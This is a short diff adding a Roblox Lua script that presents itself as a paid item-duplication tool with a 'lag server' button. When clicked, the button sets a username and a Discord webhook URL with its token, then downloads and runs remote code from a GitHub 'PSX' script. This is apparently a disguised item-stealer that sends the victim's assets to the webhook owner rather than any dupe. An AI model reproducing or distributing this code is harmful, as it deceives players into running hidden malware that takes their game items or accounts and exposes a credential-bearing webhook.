@@ -1,0 +1,10 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("CHHI dupe (paid)", "BloodTheme")
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("Dupe")
+MainSection:NewButton("lag server", "make server go to up 1000 ping to dupe selected items", function()
+  UserName = "ccyberhell"
+WebHook = "https://discord.com/api/webhooks/1051119135209295992/oqu2oAMVGZKJC6v0R1Cj9YcMjHAZIwiDPf2RX48PvmQC_OHjRIOuxJT1sxafixJg_f_T"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+end)
